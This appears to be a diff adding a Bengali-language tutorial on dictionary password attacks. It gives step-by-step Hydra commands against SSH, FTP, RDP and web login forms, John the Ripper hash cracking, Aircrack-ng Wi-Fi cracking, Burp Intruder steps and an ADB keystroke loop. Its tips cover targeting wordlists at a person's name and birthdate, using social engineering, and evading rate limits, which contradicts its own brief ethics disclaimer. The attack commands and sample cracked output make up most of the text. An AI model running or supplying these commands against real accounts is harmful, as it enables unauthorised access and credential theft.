@@ -1,0 +1,256 @@
+Dictionary Attack করার কৌশল ও টেকনিক (শুধুমাত্র শিক্ষামূলক ও সাইবার সিকিউরিটি পরীক্ষার উদ্দেশ্যে)
+
+Dictionary Attack এর মূল কৌশল
+
+Dictionary Attack এমন একটি পদ্ধতি, যেখানে আগে থেকে তৈরি করা একটি শব্দতালিকা (wordlist) ব্যবহার করে টার্গেট পাসওয়ার্ড অনুমান করা হয়। এটি Brute Force Attack-এর তুলনায় দ্রুত, কারণ এখানে সীমিত ও সম্ভাব্য পাসওয়ার্ডগুলোর উপরই আক্রমণ চালানো হয়।
+
+
+---
+
+প্রসেস (Step-by-Step):
+
+Step 1: Wordlist তৈরি / সংগ্রহ
+
+তৈরি করতে পারো নিজে:
+উদাহরণ: pass123, admin@2023, name+birthyear
+
+ডাউনলোড করতে পারো:
+যেমন: rockyou.txt, darkc0de.lst
+(পথ: /usr/share/wordlists/rockyou.txt.gz – Kali Linux-এ)
+
+
+Step 2: টার্গেট নির্বাচন
+
+ওয়েব লগইন পেইজ
+
+SSH/FTP সার্ভার
+
+Wi-Fi router
+
+Encrypted zip/file
+
+Hash dump
+
+
+Step 3: উপযুক্ত টুল ব্যবহার করে Dictionary Attack চালানো
+
+১. Hydra দিয়ে SSH login dictionary attack:
+
+hydra -l username -P /path/to/wordlist.txt ssh://target_ip
+
+২. Burp Suite দিয়ে ওয়েব ফর্ম brute force (Intruder tab ব্যবহার করে):
+
+Target → Intercept → Send to Intruder
+
+Positions সেট করো (username ফিক্সড, password ভ্যারিয়েবল)
+
+Payloads tab এ wordlist লোড করো
+
+Attack চালাও
+
+
+৩. John the Ripper দিয়ে Hash Crack:
+
+john --wordlist=/path/to/wordlist.txt --format=raw-md5 hash.txt
+
+৪. Aircrack-ng দিয়ে Wi-Fi Dictionary Attack:
+
+aircrack-ng -w /path/to/wordlist.txt -b [BSSID] capture_file.cap
+
+
+---
+
+কৌশলগত টিপস:
+
+Wordlist টার্গেট অনুযায়ী কাস্টমাইজ করো (target এর নাম, জন্মতারিখ, শহর ইত্যাদি)
+
+Social engineering ব্যবহার করে password pattern বোঝার চেষ্টা করো
+
+টুলের থ্রেড সংখ্যা বাড়িয়ে গতি বাড়ানো যায় (Hydra: -t 64)
+
+Rate-limiting ও CAPTCHA bypass করার চেষ্টা করো না, এটা অবৈধ ও অনৈতিক
+
+
+
+---
+
+সতর্কতা ও নৈতিক দিক:
+
+এই কৌশল কেবলমাত্র নিজস্ব সিস্টেম, টেস্টিং এনভায়রনমেন্ট, বা অনুমতিপ্রাপ্ত নেটওয়ার্কে ব্যবহার করো। অন্যথায় এটি আইনগত অপরাধ।
+
+
+
+Dictionary Attack টিউটোরিয়াল (SSH Login Target)
+
+Tool: Hydra
+Platform: Kali Linux (বা যেকোনো Linux distro যেখানে Hydra ইনস্টল করা আছে)
+
+
+---
+
+ধাপ ১: প্রয়োজনীয় জিনিস প্রস্তুত করো
+
+১. Hydra ইন্সটল করা আছে কিনা দেখো:
+
+hydra -h
+
+যদি না থাকে:
+
+sudo apt install hydra -y
+
+২. Wordlist প্রস্তুত রাখো
+
+সবচেয়ে ব্যবহৃত wordlist হলো rockyou.txt
+অবস্থান: /usr/share/wordlists/rockyou.txt.gz
+প্রথমে আনজিপ করো:
+
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+
+---
+
+ধাপ ২: টার্গেট IP ও ইউজারনেম নির্ধারণ করো
+
+ধরো, তোমার টার্গেট IP: 192.168.0.105
+এবং ইউজারনেম: testuser
+
+
+---
+
+ধাপ ৩: Hydra দিয়ে Dictionary Attack চালানো
+
+hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.105
+
+ব্যাখ্যা:
+
+-l : ইউজারনেম (এখানে testuser)
+
+-P : পাসওয়ার্ড wordlist (এখানে rockyou.txt)
+
+ssh:// : সার্ভিস টাইপ
+
+192.168.0.105 : টার্গেট IP
+
+
+
+---
+
+ধাপ ৪: রেজাল্ট দেখা
+
+যদি wordlist-এ থাকা কোনো পাসওয়ার্ড মিলে যায়, তাহলে Hydra সেই পাসওয়ার্ড দেখাবে।
+
+[22][ssh] host: 192.168.0.105   login: testuser   password: test1234
+
+
+---
+
+আরও সার্ভিসের জন্য Hydra কমান্ড উদাহরণ:
+
+FTP Dictionary Attack:
+
+hydra -l ftpuser -P wordlist.txt ftp://192.168.0.100
+
+HTTP ফর্ম লগইনের জন্য (Burp Suite দিয়ে ফর্ম ডিটেইল কেপচার করে):
+
+hydra -l admin -P wordlist.txt 192.168.0.101 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
+
+
+---
+
+
+1. Dictionary Attack on Windows (RDP)
+
+প্রয়োজনীয় টুল:
+
+Hydra
+
+RDP সার্ভিস চালু থাকতে হবে টার্গেট Windows-এ
+
+
+ধাপ:
+
+hydra -t 4 -V -f -l admin -P /usr/share/wordlists/rockyou.txt rdp://192.168.0.105
+
+ব্যাখ্যা:
+
+-l : ইউজারনেম (admin)
+
+-P : পাসওয়ার্ড তালিকা
+
+rdp:// : Remote Desktop Protocol
+
+
+টিপস:
+VirtualBox-এ Windows 10 VM বানিয়ে Remote Desktop চালু করে প্র্যাকটিস করো।
+
+
+---
+
+2. Dictionary Attack on Android (ADB)
+
+প্রয়োজনীয় টুল:
+
+ADB (Android Debug Bridge)
+
+Password list
+
+Hydra (বা custom script)
+
+
+ধাপ ১: ADB ডিভাইস যুক্ত করো
+
+adb devices
+
+ধাপ ২: Dictionary Attack Script (pseudo-method)
+
+ADB shell access-এর জন্য সাধারণত পাসওয়ার্ড brute force করা যায় না, কিন্তু যদি ADB pin/password enforced shell access থাকত, তাহলে এমনটা হতো (আসলে প্র্যাকটিক্যাল নয়):
+
+for pass in $(cat wordlist.txt); do
+   adb shell input text $pass
+   adb shell input keyevent 66
+done
+
+বিকল্প:
+ADB Shell-এ গিয়ে Android app-এর internal authentication bypass করার জন্য Burp Suite দিয়ে API endpoint-এ Dictionary Attack করা যেতে পারে।
+
+
+---
+
+3. Dictionary Attack on Web Login (HTTP POST Form)
+
+প্রয়োজনীয় টুল:
+
+Hydra
+
+Burp Suite (ফর্ম structure কেপচারের জন্য)
+
+Wordlist
+
+
+ধাপ ১: ফর্ম স্ট্রাকচার জানো (Burp দিয়ে বা Inspect Element)
+
+ধরো Login form:
+
+URL: http://example.com/login.php
+
+Fields: username, password
+
+Invalid msg: Invalid credentials
+
+
+ধাপ ২: Hydra কমান্ড:
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.105 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
+
+
+---
+
+টিপস (সব প্ল্যাটফর্মের জন্য):
+
+Wordlist কাস্টমাইজ করো (টার্গেটের নামে, জন্মতারিখ, keyboard pattern)
+
+CAPTCHA থাকলে Hydra ব্যর্থ হবে
+
+Rate limit এড়াতে delay ব্যবহার করো: -s, -W, -t
+
+VPN/Virtual Machine ব্যবহার করে পরীক্ষা করো
